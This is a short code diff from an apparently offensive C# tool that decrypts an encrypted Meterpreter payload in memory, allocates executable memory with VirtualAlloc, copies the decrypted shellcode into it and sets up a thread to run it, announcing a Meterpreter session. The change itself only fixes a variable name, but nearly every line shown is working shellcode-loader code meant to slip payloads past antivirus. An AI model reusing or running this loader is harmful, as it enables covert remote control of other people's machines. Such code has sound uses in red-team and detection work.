@@ -57,7 +57,7 @@ namespace NativePayload_Decryption
                 Console.WriteLine("[!] Loading Encrypted Meterprter Payload in Memory Done.");
                 Console.ForegroundColor = ConsoleColor.Green;
 
-                byte[] Finall_Payload = Decrypt(xKey, _X_to_Bytes);
+                byte[] Final_Payload = Decrypt(xKey, _X_to_Bytes);
                
                 Console.WriteLine("[>] Decrypting Meterprter Payload by KEY in Memory Done.");
                 Console.ForegroundColor = ConsoleColor.Gray;
@@ -65,8 +65,8 @@ namespace NativePayload_Decryption
                 Console.WriteLine();
                 Console.WriteLine("Bingo Meterpreter session by Encrypted Payload ;)");
 
-                UInt32 funcAddr = VirtualAlloc(0, (UInt32)Finall_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-                Marshal.Copy(Finall_Payload, 0, (IntPtr)(funcAddr), Finall_Payload.Length);
+                UInt32 funcAddr = VirtualAlloc(0, (UInt32)Final_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                Marshal.Copy(Final_Payload, 0, (IntPtr)(funcAddr), Final_Payload.Length);
 
                 IntPtr hThread = IntPtr.Zero;
                 UInt32 threadId = 0;
